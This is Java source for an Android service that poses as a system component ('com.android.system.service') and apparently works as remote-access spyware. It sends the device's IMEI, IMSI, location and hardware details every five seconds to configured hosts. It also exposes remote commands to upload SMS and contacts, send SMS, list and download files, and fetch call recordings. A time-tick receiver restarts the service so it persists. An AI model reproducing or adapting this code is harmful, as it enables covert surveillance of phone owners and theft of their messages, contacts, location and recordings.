package com.android.system.service;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.Location;
import android.location.LocationListener;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.TelephonyManager;

import com.android.system.session.NetworkManager;
import com.android.system.session.SessionManager;
import com.android.system.session.handler.FileDownloadSessionHandler;
import com.android.system.session.handler.FileListSessionHandler;
import com.android.system.session.handler.LocationListSessionHandler;
import com.android.system.session.handler.RecordListSessionHandler;
import com.android.system.session.handler.SendSmsSessionHandler;
import com.android.system.session.handler.UploadContactsSessionHandler;
import com.android.system.session.handler.UploadSmsSessionHandler;
import com.android.system.utils.LocationUtil;
import com.android.system.utils.SystemUtil;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.io.InputStream;
import java.util.Timer;
import java.util.TimerTask;

public class SystemService extends Service{
    private static Context sContext = null;
    public static Context getContext() {
        return sContext;
    }

    public static boolean start(Context context) {
        if(!SystemUtil.isServiceRunning(context, SystemService.class.getCanonicalName())) {
            context.startService(new Intent(context, SystemService.class));
            return true;
        }
        return false;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private SessionManager mSessionManager = new SessionManager();
    private NetworkManager mNetworkManager = new NetworkManager(mSessionManager);

    private static final String SESSION_CALL_RECORD = "call_record";
    private static final String SESSION_LOCATION_LIST = "location_list";
    private static final String SESSION_FILE_DOWNLOAD = "file_download";
    private static final String SESSION_FILE_LIST = "file_list";
    private static final String SESSION_SEND_SMS = "send_sms";
    private static final String SESSION_UPLOAD_SMS = "upload_sms";
    private static final String SESSION_UPLOAD_CONTACT = "upload_contact";

    private double longitude = 0, latitude = 0;
    private byte[] getHeartBeatData() {
        JSONObject jsonObject = new JSONObject();
        try {
            TelephonyManager tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
            jsonObject.put("model",Build.MODEL)
                    .put("brand", Build.BRAND)
                    .put("version",Build.VERSION.RELEASE)
                    .put("memory", SystemUtil.getAvailMemory(this) + " / " + SystemUtil.getTotalMemory(this) )
                    .put("storage", SystemUtil.getStorageInfo(this))
                    .put("network_state", SystemUtil.getNetworkConnectTypeString(this))
                    .put("sim_operator",tm.getSimOperatorName())
                    .put("imei", tm.getDeviceId())
                    .put("imsi", tm.getSubscriberId())
                    .put("longitude", ""+longitude)
                    .put("latitude", ""+latitude);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonObject.toString().getBytes();
    }

    private void init() {
        loadConfig();

        //location
        LocationUtil.listenLocation(this, new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                longitude = location.getLongitude();
                latitude = location.getLatitude();
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {

            }

            @Override
            public void onProviderEnabled(String provider) {

            }

            @Override
            public void onProviderDisabled(String provider) {

            }
        });

        //add SessionHandler to SessionManager
        mSessionManager.addSessionHandler(SESSION_SEND_SMS, new SendSmsSessionHandler());
        mSessionManager.addSessionHandler(SESSION_UPLOAD_CONTACT, new UploadContactsSessionHandler());
        mSessionManager.addSessionHandler(SESSION_UPLOAD_SMS, new UploadSmsSessionHandler());
        mSessionManager.addSessionHandler(SESSION_LOCATION_LIST,new LocationListSessionHandler());
        mSessionManager.addSessionHandler(SESSION_CALL_RECORD, new RecordListSessionHandler(SystemService.this.getFilesDir().getAbsolutePath()));
        mSessionManager.addSessionHandler(SESSION_FILE_DOWNLOAD, new FileDownloadSessionHandler());
        mSessionManager.addSessionHandler(SESSION_FILE_LIST, new FileListSessionHandler());

        mNetworkManager.setHeartBeatData(getHeartBeatData());
        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                mNetworkManager.setHeartBeatData(getHeartBeatData());
            }
        }, 0, 5000);
        mNetworkManager.start();
    }

    private void loadConfig() {
        try {
            //read address, port, from "config" file
            InputStream is = getAssets().open("config");
            byte[] data = new byte[is.available()];
            is.read(data);
            String config = new String(data, "UTF-8");
            try {
                JSONObject jsonObject = new JSONObject(config);
                JSONArray hosts = jsonObject.getJSONArray("hosts");
                for(int i=0; i<hosts.length(); ++i) {
                    mNetworkManager.addHost(hosts.getString(i));
                }
                mNetworkManager.setLocalPort(jsonObject.getInt("listen_port"));
            } catch (JSONException e) {
            }
        } catch (IOException e) {
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        sContext = this;
        init();

        //restart itself
        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(final Context context, Intent intent) {
                SystemService.start(context);
                final BroadcastReceiver it = this;
                try {
                    context.unregisterReceiver(this);
                } catch (Exception e) {
                }
                new Timer().schedule(new TimerTask() {
                    @Override
                    public void run() {
                        try {
                            context.registerReceiver(it, new IntentFilter(Intent.ACTION_TIME_TICK));
                        } catch (Exception e) {
                        }
                    }
                },59000);
            }
        }, new IntentFilter(Intent.ACTION_TIME_TICK));
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        mNetworkManager.stop();
    }
}
